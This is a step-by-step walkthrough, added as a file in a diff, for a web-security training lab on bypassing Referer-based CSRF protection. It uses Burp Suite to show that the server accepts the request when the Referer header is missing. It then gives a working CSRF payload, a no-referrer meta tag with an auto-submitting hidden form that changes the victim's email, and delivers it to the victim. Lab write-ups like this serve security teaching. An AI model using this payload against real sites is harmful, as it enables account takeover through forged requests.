@@ -1,0 +1,77 @@
+CSRF with Referer Validation Bypass – Step-by-Step PoC
+Step 1 — Login
+Open Burp Browser.
+Login using lab credentials.
+Step 2 — Change Email
+Open:
+/my-account
+Change your email address once.
+Step 3 — Capture Request
+Open Burp Suite.
+Go to:
+Proxy → HTTP history
+Find request:
+POST /my-account/change-email HTTP/2
+
+Example:
+
+POST /my-account/change-email HTTP/2
+Host: 0aad00c00338455e8089a8e5008100fd.web-security-academy.net
+
+email=abc@gmail.com
+Step 4 — Send to Repeater
+Right-click request.
+Select:
+Send to Repeater
+Step 5 — Test Referer Validation
+Modify Referer header:
+Referer: https://evil.com
+Send request.
+Observe:
+Request rejected.
+Step 6 — Remove Referer Header
+Delete entire Referer header.
+
+Example:
+
+POST /my-account/change-email HTTP/2
+Host: 0aad00c00338455e8089a8e5008100fd.web-security-academy.net
+
+email=test@evil.com
+Send request.
+Observe:
+Request accepted successfully.
+
+This confirms:
+
+Server validates Referer only if present.
+Missing Referer bypasses protection.
+Step 7 — Create CSRF PoC
+Open Exploit Server.
+Paste payload:
+<meta name="referrer" content="no-referrer">
+
+<form action="https://0aad00c00338455e8089a8e5008100fd.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="freshvictim9981@evil.com">
+</form>
+
+<script>
+document.forms[0].submit();
+</script>
+Step 8 — Test Exploit
+Click:
+Store
+Click:
+View exploit
+Observe:
+Email changes automatically.
+Step 9 — Final Delivery
+Change email to NEW unused email.
+
+Example:
+
+finalsolve2026@evil.com
+Click Store again.
+Click:
+Deliver to victim
+Lab solved successfully.
